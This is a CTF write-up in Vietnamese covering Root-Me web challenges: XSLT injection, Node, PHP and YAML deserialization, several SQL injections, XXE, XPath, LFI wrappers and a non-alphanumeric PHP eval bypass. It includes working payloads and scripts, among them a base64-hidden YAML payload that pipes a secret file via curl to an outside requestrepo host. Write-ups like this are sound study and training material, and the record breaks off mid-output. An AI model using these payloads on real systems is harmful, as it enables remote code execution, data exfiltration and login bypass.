<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
</xsl:template></xsl:stylesheet>
```

![image](https://hackmd.io/_uploads/H1oBZNZgJx.png)

![image](https://hackmd.io/_uploads/rJ5D-N-gkl.png)

![image](https://hackmd.io/_uploads/SkS9ZV-ekx.png)

```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','./.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
</xsl:template>
</xsl:stylesheet>
```

flag: `X5L7_R0ckS`

## Elixir - EEx

![image](https://hackmd.io/_uploads/rkqvTNWlkl.png)

bài đề có nhấn mạnh Elixir

## JWT - Unsecure Key Handling


## LDAP injection - Authentication

## Node - Serialize

![image](https://hackmd.io/_uploads/Sy5oHrWgkg.png)

![image](https://hackmd.io/_uploads/ry7-vB-lyx.png)

ta có thể thấy ta truyền giá trị vào thì giá trị profile sẽ được gán là ta truyền vào -> sau đó base64 và set cookie, như vậy có thể đoán là lần đăng nhập tiếp theo server sẽ lấy dữ liệu này mục đích ghi nhớ đăng nhập của ta 

Với đề bài thì mình searching:

https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/Node/#exploit
ở đây bug serialize từ module node-serialize thực hiện desererialize dữ liệu.

Ta thử với cookie:

![image](https://hackmd.io/_uploads/BkdfsSbgye.png)

![image](https://hackmd.io/_uploads/HJFQjr-xJe.png)

quả thật là rce thành công

![image](https://hackmd.io/_uploads/rJ4_iBblJe.png)

![image](https://hackmd.io/_uploads/ryNhiSbxJe.png)

![image](https://hackmd.io/_uploads/HJo12SWe1e.png)

flag: `Y3pS3r0d3c0mp4nY1sB4d!`

## NoSQL injection - Authentication

![image](https://hackmd.io/_uploads/rkBinrWxkl.png)

dec: `Find the username of the hidden user.`

![image](https://hackmd.io/_uploads/H1wwXLbeJl.png)

flag: `nosqli_no_secret_4_you`

dùng regex để check user khác ngoài admin vì nếu ta login thành công thì hiển thị admin is connected

## PHP - Path Truncation

dec: `Retrieve an access to the administration’s zone.`

![image](https://hackmd.io/_uploads/B1A1_IZxkx.png)

![image](https://hackmd.io/_uploads/rJig_LWgJg.png)

Trong phiên bản PHP < 5.3, độ dài tối đa của chuỗi là 4096 ký tự. Nếu nó gặp một chuỗi dài hơn thế, nó sẽ chỉ cần cắt bớt chuỗi đó, xóa bất kỳ ký tự nào sau độ dài tối đa. Đây chính xác là những gì chúng ta muốn để thoát khỏi phần mở rộng tệp của lỗ hổng LFI của chúng ta!

https://jbedelsec.wordpress.com/2018/12/11/exploiting-php-file-truncation-php-5-3/

![image](https://hackmd.io/_uploads/H1CGOLZxJg.png)

flag: `110V3TrUnC4T10n`

## PHP - Serialization

![image](https://hackmd.io/_uploads/Bky6dLWeJx.png)

```
<?php
define('INCLUDEOK', true);
session_start();

if(isset($_GET['showsource'])){
    show_source(__FILE__);
    die;
}

/******** AUTHENTICATION *******/
// login / passwords in a PHP array (sha256 for passwords) !
require_once('./passwd.inc.php');


if(!isset($_SESSION['login']) || !$_SESSION['login']) {
    $_SESSION['login'] = "";
    // form posted ?
    if($_POST['login'] && $_POST['password']){
        $data['login'] = $_POST['login'];
        $data['password'] = hash('sha256', $_POST['password']);
    }
    // autologin cookie ?
    else if($_COOKIE['autologin']){
        $data = unserialize($_COOKIE['autologin']);
        $autologin = "autologin";
    }

    // check password !
    if ($data['password'] == $auth[ $data['login'] ] ) {
        $_SESSION['login'] = $data['login'];

        // set cookie for autologin if requested
        if($_POST['autologin'] === "1"){
            setcookie('autologin', serialize($data));
        }
    }
    else {
        // error message
        $message = "Error : $autologin authentication failed !";
    }
}
/*********************************/
?>
```

Có thể thấy tại đây -> có chức năng login hoặc nếu có cookie ghi nhớ thì nó sẽ được unserialize

```
<?php

// message ?
if(!empty($message))
    echo "<p><em>$message</em></p>";

// admin ?
if($_SESSION['login'] === "superadmin"){
    require_once('admin.inc.php');
}
// user ?
elseif (isset($_SESSION['login']) && $_SESSION['login'] !== ""){
    require_once('user.inc.php');
}
// not authenticated ? 
else {
?>
```

$_SESSION['login'] === "superadmin" thì có vẻ như hiển thị trang admin

![image](https://hackmd.io/_uploads/Hy7IAUZxyx.png)

![image](https://hackmd.io/_uploads/HJpn-vZxyg.png)

![image](https://hackmd.io/_uploads/rJtktqXgyl.png)

```
<?php
$data['login'] = 'superadmin';
$data['password'] = true;

$s = serialize($data);
// $s = 'a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}';

echo urlencode($s);

// var_dump(unserialize($s));
?>
```

![image](https://hackmd.io/_uploads/BJmaFqXxJl.png)

flag: `NoUserInputInPHPSerialization!`

## SQL injection - Numeric

![image](https://hackmd.io/_uploads/BJmv95mg1e.png)

![image](https://hackmd.io/_uploads/B1L_pq7lkg.png)

cơ sở dữ liệu là sqlite

![image](https://hackmd.io/_uploads/r1dq6cXxJl.png)

flag: `aTlkJYLjcbLmue3`

## SQL Injection - Routed

dec: yêu cầu tương tự như bài ở trên

http://securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html

![image](https://hackmd.io/_uploads/SyRXhySekl.png)

![image](https://hackmd.io/_uploads/HkT71lSeyl.png)

![image](https://hackmd.io/_uploads/SkT41lHlyx.png)

flag: `qs89QdAs9A`

## SQL Truncation

![image](https://hackmd.io/_uploads/r15wklre1g.png)

hint:
![image](https://hackmd.io/_uploads/Sy8pJgBx1g.png)

![image](https://hackmd.io/_uploads/HJyEIxSg1x.png)

![image](https://hackmd.io/_uploads/H1zNUxHgyx.png)

flag: `J41m3Qu4nD54Tr0nc`

## XML External Entity

![image](https://hackmd.io/_uploads/H1Krhzrlyx.png)

như đề bài có hint là rss ta nghĩ ngay đến xxe qua rss luôn

![image](https://hackmd.io/_uploads/Sk0w3GSlyx.png)

ở đây trang web có chức năng load xml từ url từ xa 

![image](https://hackmd.io/_uploads/rkjK2fSgyl.png)

ta sẽ tạo xml như này, bình thường thì /etc/passwd bị detect nên ta dùng php://wrapper filter để đọc file

![image](https://hackmd.io/_uploads/ByrV6fBekx.png)

Thành công nhận được nội dung file

```
<?php

echo '<html>';
echo '<header><title>XXE</title></header>';
echo '<body>';
echo '<h3><a href="?action=checker">checker</a>&nbsp;|&nbsp;<a href="?action=auth">login</a></h3><hr />';

if ( ! isset($_GET['action']) ) $_GET['action']="checker";

if($_GET['action'] == "checker"){

   libxml_disable_entity_loader(false);
   libxml_use_internal_errors(true);

   echo '<h2>RSS Validity Checker</h2>
   <form method="post" action="index.php">
   <input type="text" name="url" placeholder="http://host.tld/rss" />
   <input type="submit" />
   </form>';


    if(isset($_POST["url"]) && !(empty($_POST["url"]))) {
        $url = $_POST["url"];
        echo "<p>URL : ".htmlentities($url)."</p>";
        try {
            $ch = curl_init("$url");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,0); 
            $inject = curl_exec( $ch );
            curl_close($ch);
            $string = simplexml_load_string($inject, null, LIBXML_NOENT);
            if ( ! is_object($string) || !$string || !($string->channel) || !($string->channel->item)) throw new Exception("error"); 

            foreach($string->channel->item as $row){
                print "<br />";
                print "===================================================";
                print "<br />";
                print htmlentities($row->title);
                print "<br />";
                print "===================================================";
                print "<br />";
                print "<h4 style='color: green;'>XML document is valid</h4>";
            }
        } catch (Exception $e) {
            print "<h4 style='color: red;'>XML document is not valid</h4>";
        }

    }
}

if($_GET['action'] == "auth"){
    echo '<strong>Login</strong><br /><form METHOD="POST">
    <input type="text" name="username" />
    <br />
    <input type="password" name="password" />
    <br />
    <input type="submit" />
    </form>
    ';
    if(isset($_POST['username'], $_POST['password']) && !empty($_POST['username']) && !empty($_POST['password']))
    {
        $user=$_POST["username"];
        $pass=$_POST["password"];
        if($user === "admin" && $pass === "".file_get_contents(".passwd").""){
            print "Flag: ".file_get_contents(".passwd")."<br />";
        }

    }

}


echo '</body></html>';
```

ta thấy flag nằm ở .passwd

![image](https://hackmd.io/_uploads/S1znazSg1g.png)


flag: `c934fed17f1cac3045ddfeca34f332bc`

## XPath injection - Authentication

![image](https://hackmd.io/_uploads/Bk9Ey7rx1l.png)

![image](https://hackmd.io/_uploads/Sk58d7BlJe.png)

Nhưng mà ở đây ta có thể thấy được là trang có 3 người dùng -> như tiêu đề xpath thì ta đoán được dữ liệu tại đây được lưu vào trong file xml và được truy xuất qua xpath, cũng na ná sqli thôi

![image](https://hackmd.io/_uploads/SJshOQBlkx.png)

flag: `6FkC67ui8njEepIK5Gr2Kwe`

## Yaml - Deserialization

![image](https://hackmd.io/_uploads/HJ6D9QBgkx.png)

https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization

quan sát thấy phần url có base64 có key là yaml và phần nội dung sau : sẽ được hiển thị trên trang -> đoán là dữ liệu ở đây được load yaml.unsafe

### CVE-2017-18342

https://net-square.com/yaml-deserialization-attack-in-python.html

```
import base64
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
import subprocess

class Payload(object):
    def __reduce__(self):
        return subprocess.Popen, ('wget http://00br69e7.requestrepo.com')

# Serialize data
deserialized_data = yaml.dump(Payload())

deserialized_data = 'yaml: ' + deserialized_data

# Encode the serialized data to bytes and then encode it using base64
# encoded_data = base64.b64encode(deserialized_data.encode('utf-8'))

# Print base64 encoded result
print(deserialized_data)

```

trông thì nó cơ bản giống với pickle trong python
ở đây ta cần thêm tupler nữa để rce

![image](https://hackmd.io/_uploads/BJbZmrHxkg.png)

![image](https://hackmd.io/_uploads/S1JXmSSlyx.png)

```
yaml: !!python/object/apply:subprocess.Popen
- !!python/tuple
 - python
 - -c
 - "__import__('os').system(str(__import__('base64').b64decode('Y2F0IC5wYXNzd2QgfCBjdXJsIC1kIEAtIDAwYnI2OWU3LnJlcXVlc3RyZXBvLmNvbQ==').decode()))"
```

![image](https://hackmd.io/_uploads/rkYHQSrgJx.png)


flag: `561385a008727f860eda1afb7f8eba76`

## API - Broken Access 2

![image](https://hackmd.io/_uploads/By0cXHrgkg.png)

Bài này là bài nâng cao api swagger mà server có đề cập ở 2 bài trước

## GraphQL - Backend injection

```
{
    rocket(id: "0 union select null,(select value from flag limit 1),country,is_active from rockets limit 40,1--") {
        name
        country
        is_active
    }
}
```

```
{
    rocket(id: "1 and (SELECT table_name FROM information_schema.tables where table_name like 'flag%' limit 1)='flag'--") {
        name
        country
        is_active
    }
}
```

![image](https://hackmd.io/_uploads/HyklSbgbkl.png)

![image](https://hackmd.io/_uploads/HyherZxb1x.png)

![image](https://hackmd.io/_uploads/S1gVS-lZ1e.png)

Có cột id và value trong bảng flag

![image](https://hackmd.io/_uploads/ry05IWgb1l.png)


```
{"query": "{\n    rocket(id: \"1 and (SELECT substring(column_name,§1§,1) FROM information_schema.columns where table_name like 'flag%' limit 2,1)='§f§'--\") {\n        name\n        country\n        is_active\n    }\n}"}
```


## Local File Inclusion - Wrappers

bài lfi hint như tiêu đều -> đi vào trang chính có chức năng upload file chỉ cho phép up file đuôi jpg.

thử qua php filter không được -> nghĩ tới upload file nên mình thử file zip

```
┌──(l3mnt2010㉿ASUSEXPERTBOOK)-[~/rootme]
└─$ zip a.zip a.php
  adding: a.php (stored 0%)

┌──(l3mnt2010㉿ASUSEXPERTBOOK)-[~/rootme]
└─$ mv payload.zip a.jpg;
mv: cannot stat 'payload.zip': No such file or directory

┌──(l3mnt2010㉿ASUSEXPERTBOOK)-[~/rootme]
└─$ mv a.zip a.jpg;

┌──(l3mnt2010㉿ASUSEXPERTBOOK)-[~/rootme]
└─$ cat a.php
<?php echo file_get_contents('index.php'); ?>

```

thực hiện zip 1 file php và đổi tên thành jpg -> upload thành công

dùng wrapper zip để giải nén file và đồng thời access đến a.php

`http://challenge01.root-me.org/web-serveur/ch43/index.php?page=zip://tmp/upload/OpcgreZoP.jpg%23a` như ta thấy ban đầu include sẽ tự động thêm .php vào file ta truyền vào

![image](https://hackmd.io/_uploads/SyvBd3xWkx.png)

Thành công nhận nội dung file php. Do server cấm system nên ta dùng scandir để check các file trong thư mục do trả ra một array nên ta sẽ dùng var_dump để đọc nội dung `<?php var_dump(scandir('.')); ?>`

![image](https://hackmd.io/_uploads/H1XMY2lZye.png)

tên file flag là `flag-mipkBswUppqwXlq9ZydO.php`

![image](https://hackmd.io/_uploads/B1X2Y3gZJl.png)

flag: `lf1-Wr4pp3r_Ph4R_pwn3d`

ở đây ta để ý thấy đề cập đến phar -> có vẻ dùng phar vẫn được

## PHP - Eval

hint: `Non-alphanumeric PHP code`


source:

```
<html>
<head>
</head>
<body>
 
<h4> PHP Calc </h4>
 
<form action='index.php' method='post'>
    <input type='text' id='input' name='input' />
    <input type='submit' />
<?php
 
if (isset($_POST['input'])) {
    if(!preg_match('/[a-zA-Z`]/', $_POST['input'])){
        print '<fieldset><legend>Result</legend>';
        eval('print '.$_POST['input'].";");
        print '</fieldset>';
    }
    else
        echo "<p>Dangerous code detected</p>";
}
?>
</form>
</body>
</html>
```

như ta thấy ta nhập input nếu kiểm tra input không chứa chữ cái từ a->z kể cả in hoa và dấu backtick thì thực hiện eval code

Nguồn: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#perl-like

```
$_=[];
$_=@"$_"; 
$_=$_['!'=='@']; ;
$___=$_; 
$__ = $_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$___=$__; 
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;
$___.=$__; 
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;
$___.=$__; 
$__ = $_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$___.=$__; 
$__=$_;
++$__;++$__;++$__;++$__; 
$___.=$__; 
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;
$___.=$__;
$__=$_;

$_____ = '';
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;

$____='';
++$__;++$__;
$____.=$__;
$__=$_;
$____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$____.=$__;
$__=$_;

$______='.';
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$______.=$__;
$__=$_;
$______.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$______.=$__;
$______.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$______.=$__;
$__=$_;
++$__;++$__;++$__;
$______.=$__;
$__=$_;
$__________ = $____." ".$______ ;
$___($_____($__________ ))
```

![image](https://hackmd.io/_uploads/rJKWLpgWkx.png)

flag: `M!xIng_PHP_w1th_3v4l_L0L`

## PHP - Eval - Advanced filters bypass

## Java - Spring Boot

![image](https://hackmd.io/_uploads/HJgsJE-bke.png)


## SQL injection - Error

Như đề bài -> khi ta vào trang web có 2 page là login và contents thử fuzz chức năng login có vẻ không có sqli được -> chuyển hướng qua pages contents

![image](https://hackmd.io/_uploads/BkbyofbZJg.png)

sau khi thử 2 param thì order có sinh ra lỗi -> có vẻ sink nằm ở đây
-> dùng cast as int với string để sql trả ra error

```
import requests
import re

session = requests.Session()

# URL mẫu với format string cho OFFSET
base_url = "http://challenge01.root-me.org:80/web-serveur/ch34/?action=contents&order=asc, CAST((select table_name from information_schema.tables limit 1 OFFSET {offset}) AS int)--"
cookies = {"PHPSESSID": "15ad3f4448ad899ad5edab914068910a"}

# Lặp qua offset từ 1 đến 70
for offset in range(0, 71):
    url = base_url.format(offset=offset)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }

    response = session.get(url, headers=headers, cookies=cookies)

    # Sử dụng regex để tìm tên bảng trong nội dung trả về
    match = re.search(r'invalid input syntax for integer: "([^"]+)"', response.text)

    if match:
        table_name = match.group(1)  # Lấy tên bảng từ kết quả match
        print(f"Offset {offset}: Table name - {table_name}")
    else:
        print(f"Offset {offset}: No table name found")

```

![image](https://hackmd.io/_uploads/BJ2sCGZWkx.png)

![image](https://hackmd.io/_uploads/rkxnRMWZ1g.png)

![image](https://hackmd.io/_uploads/H1Zeg7ZZye.png)

![image](https://hackmd.io/_uploads/B1nWemZWkl.png)

username: admin
password: 1a2BdKT5DIx3qxQN3UaC

![image](https://hackmd.io/_uploads/HyGNgXWZke.png)

flag: `1a2BdKT5DIx3qxQN3UaC`

## SQL injection - Insert

## PHP - SerializationPHP

- Đây là một bài serialize đơn giản với PHP. Có source như sau:


```

<?php
define('INCLUDEOK', true);
session_start();

if(isset($_GET['showsource'])){
    show_source(__FILE__);
    die;
}

/******** AUTHENTICATION *******/
// login / passwords in a PHP array (sha256 for passwords) !
require_once('./passwd.inc.php');


if(!isset($_SESSION['login']) || !$_SESSION['login']) {
    $_SESSION['login'] = "";
    // form posted ?
    if($_POST['login'] && $_POST['password']){
        $data['login'] = $_POST['login'];
        $data['password'] = hash('sha256', $_POST['password']);
    }
    // autologin cookie ?
    else if($_COOKIE['autologin']){
        $data = unserialize($_COOKIE['autologin']);
        $autologin = "autologin";
    }

    // check password !
    if ($data['password'] == $auth[ $data['login'] ] ) {
        $_SESSION['login'] = $data['login'];

        // set cookie for autologin if requested
        if($_POST['autologin'] === "1"){
            setcookie('autologin', serialize($data));
        }
    }
    else {
        // error message
        $message = "Error : $autologin authentication failed !";
    }
}
/*********************************/
?>



<html>
<head>
<style>
label {
    display: inline-block;
    width:150px;
    text-align:right;
}
input[type='password'], input[type='text'] {
    width: 120px;
}
</style>
</head>
<body>
<h1>Restricted Access</h1>

<?php

// message ?
if(!empty($message))
    echo "<p><em>$message</em></p>";

// admin ?
if($_SESSION['login'] === "superadmin"){
    require_once('admin.inc.php');
}
// user ?
elseif (isset($_SESSION['login']) && $_SESSION['login'] !== ""){
    require_once('user.inc.php');
}
// not authenticated ? 
else {
?>
<p>Demo mode with guest / guest !</p>

<p><strong>superadmin says :</strong> New authentication mechanism without any database. <a href="index.php?showsource">Our source code is available here.</a></p>

<form name="authentification" action="index.php" method="post">
<fieldset style="width:400px;">
<p>
    <label>Login :</label>
    <input type="text" name="login" value="" />
</p>
<p>
    <label>Password :</label>
    <input type="password" name="password" value="" />
</p>
<p>
    <label>Autologin next time :</label>
    <input type="checkbox" name="autologin" value="1" />
</p>
<p style="text-align:center;">
    <input type="submit" value="Authenticate" />
</p>
</fieldset>
</form>
<?php
}

if(isset($_SESSION['login']) && $_SESSION['login'] !== ""){
    echo "<p><a href='disconnect.php'>Disconnect</a></p>";
}
?>
</body>
</html>

```

- Như ta có thể thấy là trang web chưa chức năng login, logout và rememmber user.

- Đầu tiên quan sát nơi có thể sẽ chưa flag đó là:
- ![image](https://hackmd.io/_uploads/rkxO59K6a.png)

- Nếu mà người dùng đăng nhập với tài khoản admin tương được với _SESSION người dùng là `superadmin` thì bài toán được sol :>

- Chức năng nhập kết hợp với chức năng rememmber account!!!


```
require_once('./passwd.inc.php');


if(!isset($_SESSION['login']) || !$_SESSION['login']) {
    $_SESSION['login'] = "";
    // form posted ?
    if($_POST['login'] && $_POST['password']){
        $data['login'] = $_POST['login'];
        $data['password'] = hash('sha256', $_POST['password']);
    }
    // autologin cookie ?
    else if($_COOKIE['autologin']){
        $data = unserialize($_COOKIE['autologin']);
        $autologin = "autologin";
    }

    // check password !
    if ($data['password'] == $auth[ $data['login'] ] ) {
        $_SESSION['login'] = $data['login'];

        // set cookie for autologin if requested
        if($_POST['autologin'] === "1"){
            setcookie('autologin', serialize($data));
        }
    }
    else {
        // error message
        $message = "Error : $autologin authentication failed !";
    }
}
/*********************************/
?>

```

- Như ta có thể thấy là khi mà login thì sẽ nhận username và passwd được sha256 encode nếu mà tồn tại `$_COOKIE['autologin']` thì sẽ serialize `$_COOKIE['autologin']` và đăng nhập với tài khoản đó mà không check gì luôn:<

- Sơ qua có thể thấy ta sẽ đấm vào chỗ không check :3

- Vấn đề đầu tiên là `($data['password'] == $auth[ $data['login'])` có thể nhận thấy lỗ hổng losecompare ở đây thì mình set `password = true` để bypass với type jugging. 

- Vấn đề thứ 2 là để `$_SESSION['login'] === "superadmin"` thì `$_SESSION['login'] = $data['login'];` vì vậy cho nên cho userame = 'superadmin' là bypass.


### POC


```
<?php

$string = "a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A5%3A%22guest%22%3Bs%3A8%3A%22password%22%3Bs%3A64%3A%2284983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec%22%3B%7D";
$string = urldecode($string);
$a = unserialize($string);
var_dump($a);

$data['login'] = 'superadmin';
$data['password'] = true;

echo (urlencode(serialize($data)));
?>

```

- ![image](https://hackmd.io/_uploads/rkuMcqF6T.png)


- - Và đã thành công:
- ![image](https://hackmd.io/_uploads/SkzJccYpa.png)

Flag `NoUserInputInPHPSerialization!`


## Deserialization Overflow


```
<?php
include 'flag.php';

ini_set('display_errors', 1);
error_reporting(E_ALL);

class User
{
    protected $_username;
    protected $_password;
    protected $_logged = false;
    protected $_email = '';

    public function __construct($username, $password)
    {
        $this->_username = $username;
        $this->_password = $password;
        $this->_logged = false;
    }

    public function setLogged($logged)
    {
        $this->_logged = $logged;
    }

    public function isLogged()
    {
        return $this->_logged;
    }

    public function getUsername()
    {
        return $this->_username;
    }

    public function getPassword()
    {
        return $this->_password;
    }
}

function storeUserSession($user)
{
    $serialized_value = serialize($user);
    // avoid the storage of null byte, replace it with \0 just in case some session storage don't support it
    // this is done because protected object are prefixed by \x00\x2a\x00 in php serialisation
    $data = str_replace(chr(0) . '*' . chr(0), '\0\0\0', $serialized_value);
    $_SESSION['user'] = $data;
}

function getUserSession()
{
    $user = null;
    if (isset($_SESSION['user'])) {
        $data = $_SESSION['user'];
        $serialized_user = str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
        $user = unserialize($serialized_user);
    } else {
        $user = new User('guest', '');
    }
    return $user;
}

session_start();
$errorMsg = "";
$currentUser = null;

// keep entered values :
if (isset($_POST['submit'])) {
    $currentUser = new User($_POST['username'], $_POST['password']);
    $isLogged = $currentUser->getUsername() === 'admin' && 
        hash('sha512',$currentUser->getPassword()) === 'b3b7b663909f8e9b4e2a581337159e8a5e468c088ec802cb99a027c1dcbefb7d617fcab66ab4402d4617cde33f7fce93ae3c4e8f77aec2bb5f8c7c8aec3bbc82'; // don't try to bruteforce me this is useless
    $currentUser->setLogged($isLogged);
    $errorMsg = ($isLogged) ? '' : 'Invalid username or password.';
    storeUserSession($currentUser);
} else {
    $currentUser = getUserSession();
}

if ($currentUser->isLogged()) {
    echo 'you are logged in! congratz, the flag is: ' . $FLAG;
    die();
}

if (isset($_GET['source'])) {
    show_source(__FILE__);
    die();
}
?>
```

- Đầu tiên quan sát cách để có được flag đó là _isLogged phải set thành true.

```
if ($currentUser->isLogged()) {
    echo 'you are logged in! congratz, the flag is: ' . $FLAG;
    die();
}
```

- Trang web có chức năng đăng nhập sau khi submit sẽ khởi tạo `  $currentUser = new User($_POST['username'], $_POST['password']); ` sau đó gán isLogged = true nếu username của `currentUser` === 'admin' và hash('sha512', password) === 'b3b7b663909f8e9b4e2a581337159e8a5e468c088ec802cb99a027c1dcbefb7d617fcab66ab4402d4617cde33f7fce93ae3c4e8f77aec2bb5f8c7c8aec3bbc82' 
- Cuối cùng gọi hàm `storeUserSession` tiến hành `serialize` `$currentUser` sau đó thực hiện thay thế ``(chr(0) . '*' . chr(0)`` bằng `\0\0\0` trong thông tin vừa dược serialize
- ![image](https://hackmd.io/_uploads/rk9qFqt06.png)

- Mình giải thích thêm ở đây là những thuộc tính là protected thì sau khi serialize thì sẽ có dấu `*` đứng trước nó

```
<?php
    class Person {
        public $name = "Tom";
        private $age = 18;
        protected $sex = "male";
        public function hello() {
            echo "hello";
        }
    }
    $example = new Person();
    $example_ser = serialize($example);
    echo $example_ser;
-- sau khi thực hiện kết quả sẽ là 
O:6:"Person":3:{s:4:"name";s:3:"Tom";s:11:"Personage";i:18;s:6:"*sex";s:4:"male";}
```
- ![image](https://hackmd.io/_uploads/SJkE59K0p.png)

- oke bây giờ thì còn hàm  :-1: 

``
function getUserSession()
{
    $user = null;
    if (isset($_SESSION['user'])) {
        $data = $_SESSION['user'];
        $serialized_user = str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
        $user = unserialize($serialized_user);
    } else {
        $user = new User('guest', '');
    }
    return $user;
}
``

- hàm này sẽ lấy session và lấy ra giá trị username sau đó thực hiện thay thế ngược lại giá trị `\0\0\0` bằng ``(chr(0) . '*' . chr(0)`` và thực hiện unserialize


- Vậy có thể hiểu được sink của cuộc tấn công nằm ở này.

- Nhưng mà ta khó có thể control được đầu vào của isLogged, bơi vì password đã được hash với `sha512` :(

- Stuck ở chỗ này khá lâu, thì mình để ý đoạn này tại sao server lại replace_all `null*null` bằng `\0\0\0` và tên chall là over-flow:>
- Over-flow : mô tả tình trạng khi một hệ thống hoặc nguồn tài nguyên không thể xử lý hoặc chứa các dữ liệu hoặc giá trị lớn hơn giới hạn được quy định.
- Vậy nên ta lợi dụng việc khi lưu sessionUser thì sau khi lưu lần đầu số byte của nó tăng 3 bytes từ ` * ` sang `\0\0\0` vậy nên đối với $currentUser có 4 phần từ protected nên sau khi thay thế sẽ tăng 12 bytes. Sau khi unserialize nó mới trở lại ban đầu.

- >> Ta chèn `\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0` vào `username` và password vào `"%3b"%3bs%3a12%3a"%00%00_password"%3bs%3a3%3a"123"%3bs%3a10%3a"%00%00_logged"%3bb%3a1%3bs%3a9%3a"%00*%00_email"%3bs%3a44%3a` khi đó thì quá trình getSessionUser
- Luồng xử lí như sau:
- ![image](https://hackmd.io/_uploads/HkdIk2KRT.png)

- ![image](https://hackmd.io/_uploads/r1o_12K0p.png)

- Lúc này session đã được lưu lại.
- ![image](https://hackmd.io/_uploads/rypxx3YR6.png)

- GET / sẽ thực hiện gọi hàm `getUserSession` và thực hiện thay thế "\0\0\0" thành `null*null` deserialize ta sẽ ghi đè được isLogged là `true`.

- Kết quả em nhận được sau khi deserial ở hàm getSessionUser là:
```
object(User)#2 (4) {   
["_username":protected]=>   string(60) "**********";s:12:"*_password";s:77:"";"   
